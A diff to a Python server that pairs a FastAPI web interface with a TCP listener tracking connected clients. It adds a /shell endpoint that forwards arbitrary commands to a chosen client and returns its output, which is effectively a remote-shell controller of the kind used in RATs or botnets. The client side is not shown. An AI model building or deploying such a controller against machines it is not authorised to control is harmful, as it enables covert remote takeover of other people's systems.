@@ -1,3 +1,5 @@
+from os import name
+from platform import java_ver
 from fastapi import FastAPI
 import threading
 import uvicorn
@@ -21,8 +23,8 @@ def tcp_conn(client_socket, address): # TCP connection daemon thread
             match json_data['type']:
                 case 'coltroller': # Received TCP request from controller
                     controller_cmd(client_socket,json_data['content'])
-                case 'client': # Received TCP request from client
-                    client_msg(json_data['content'],address)
+                #case 'client': # Received TCP request from client
+                    #client_msg(json_data['content'],address)
         except:
             print(end='')
 
@@ -31,8 +33,9 @@ def listen_tcp():
     while True:
         client_socket,address = server.accept() # Accept TCP connection
         print('Connection ' + str(address)) # Print connection base info
-        socket_conns[str(address)] = client_socket # add connection to dic
-        threading.Thread(target=tcp_conn,args=(client_socket,address),daemon=True).start()
+        conn_name = address[0] + ':' + str(address[1])
+        socket_conns[conn_name] = client_socket # add connection to dic
+        threading.Thread(target=tcp_conn,args=(client_socket,address),daemon=True,name=conn_name).start()
 
 # endregion
 
@@ -45,16 +48,32 @@ def server_version():
 
 @appsl.get("/list/")
 def list_connections():
-    return str(socket_conns)
+    conn_list = {}
+    print(threading.enumerate())
+    for key in list(socket_conns.keys()):
+        conn_list[key] = str(socket_conns[key])
+    return conn_list
 
 
-@appsl.get("/hello/{conn_address}")
-def print_hello(conn_address):
-    webcoltrol = socket_conns[conn_address]
-    webcoltrol.send(json.dumps({
-        'type': 'coltroller',
-        'content': 'hello'
+@appsl.get("/shell/{conn_address}")
+def exec_shell(conn_address:str,command:str=None):
+    shell = socket_conns[conn_address]
+    shell.send(json.dumps({
+        'type': 'shell',
+        'content': command
     }).encode())
+    recv_length = 2048
+    while True:
+        recv_data = shell.recv(recv_length).decode()
+        json_data = json.loads(recv_data)
+        match json_data['type']:
+            case 'length':
+                recv_length = json_data['content']
+                shell.send(json.dumps({
+                    'type': 'okay'
+                }).encode())
+            case 'data':
+                return json_data['content']
 
 #endregion
 
@@ -74,7 +93,7 @@ def client_msg(msg,address):
     print(msg, end=' ')
     print(address)
 
-#region - Heartbeat check alive
+# region - Heartbeat check alive
 
 def client_heartbeat():
     while True:
@@ -89,9 +108,17 @@ def client_heartbeat():
                 if json_data['content'] != 'alive':
                     print("Undefind " + key)
                     socket_conns.pop(key)
+                    for thread in threading.enumerate():
+                        if thread.name == key:
+                            thread.join()
+                            thread.setDaemon(False)
             except:
-                print("Undefind " + key)
+                print("Connection lost " + key)
                 socket_conns.pop(key)
+                for thread in threading.enumerate():
+                    if thread.name == key:
+                        thread.join()
+                        thread.setDaemon(False)
         time.sleep(1)
 
 # endregion
@@ -112,6 +139,6 @@ def tcplistener(): # socket tcp service
 # endregion
 
 if __name__ == "__main__":
-    fastAPI = threading.Thread(target=fastapi).start()
-    tcpListener = threading.Thread(target=tcplistener).start()
-    heartbeat = threading.Thread(target=client_heartbeat).start()
+    fastAPI = threading.Thread(target=fastapi,name='FastAPI').start()
+    tcpListener = threading.Thread(target=tcplistener,name='TCPListener').start()
+    heartbeat = threading.Thread(target=client_heartbeat,name='HeartBeat').start()
